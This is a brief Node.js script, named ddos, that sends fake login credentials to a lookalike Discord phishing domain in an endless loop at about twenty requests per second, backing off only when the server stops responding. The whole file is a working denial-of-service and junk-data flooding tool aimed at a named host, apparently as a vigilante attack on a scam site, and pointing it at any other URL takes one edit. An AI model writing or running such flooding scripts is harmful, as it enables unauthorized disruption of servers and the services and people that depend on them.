const axios = require('axios');
const url = 'https://dliscord.com/discord/login';
let timeout = 50;

async function ddos() {
    while (true) {
        const data = {
            login: "sike@gmail.com",
            password: "lolgetscammed"
        }
        axios.post(url, data)
        .then(resp =>{
            console.log(resp);
        })
        .catch(err =>{
            timeout = err.response ? 50 : 2000;
            console.log('Sent Request!', err.response ? err.response.status : "Server Appears to be dead, request speed slowed down");
        });
        await new Promise(resolve => setTimeout(resolve, timeout));
    }
}
ddos();